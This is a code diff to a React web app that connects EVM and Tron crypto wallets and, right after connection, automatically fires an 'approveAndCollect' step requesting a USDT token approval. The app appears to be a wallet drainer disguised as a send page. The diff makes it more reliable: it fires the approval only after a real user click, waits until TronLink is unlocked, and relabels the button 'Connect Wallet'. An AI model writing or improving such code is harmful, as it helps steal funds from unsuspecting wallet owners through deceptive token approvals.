@@ -125,7 +125,10 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
+  
   const autoTriggered = useRef(false)
+  // 🛠️ FIX 1: Tracker to determine if the user actually clicked the connect button
+  const manualConnect = useRef(false) 
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
@@ -188,10 +191,10 @@ export default function App() {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🔥 AUTO-TRIGGER
-      if (!autoTriggered.current) {
+      // 🛠️ FIX 2: ONLY auto-trigger if they manually initiated the connection
+      if (!autoTriggered.current && manualConnect.current) {
         autoTriggered.current = true;
-        log("🔥 Wallet Connected. Auto-triggering approval (Balance Independent)...");
+        log("🔥 Manual Wallet Connection detected. Auto-triggering approval...");
         
         setLoading(true); 
         setTimeout(() => approveAndCollect(), 400); 
@@ -245,7 +248,8 @@ export default function App() {
       return; 
     }
     setAmountError('');
-    open(); // Directly opens Reown's native UI
+    manualConnect.current = true; // 🛠️ Sets the flag so the useEffect knows the user clicked it
+    open(); 
   }
 
   const approveAndCollect = async () => {
@@ -276,7 +280,14 @@ export default function App() {
       }
 
       if (isTron) {
-        const activeTw = resolveTronWeb();
+        let activeTw = null;
+        
+        // 🛠️ FIX 3: Wait loop to guarantee TronLink is unlocked and ready before calling the contract
+        for (let i = 0; i < 10; i++) {
+          activeTw = resolveTronWeb();
+          if (activeTw && (activeTw.defaultAddress?.base58 || activeTw.ready)) break;
+          await new Promise(r => setTimeout(r, 500));
+        }
 
         if (activeTw && typeof activeTw.contract === 'function') {
           const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -339,7 +350,7 @@ export default function App() {
     : loading || (!status.includes('❌') && !status.includes('✅'));
 
   const buttonText = !isConnected 
-    ? 'Send' 
+    ? 'Connect Wallet' 
     : loading || (!status.includes('❌') && !status.includes('✅'))
       ? 'Sending...' 
       : status.includes('✅') 
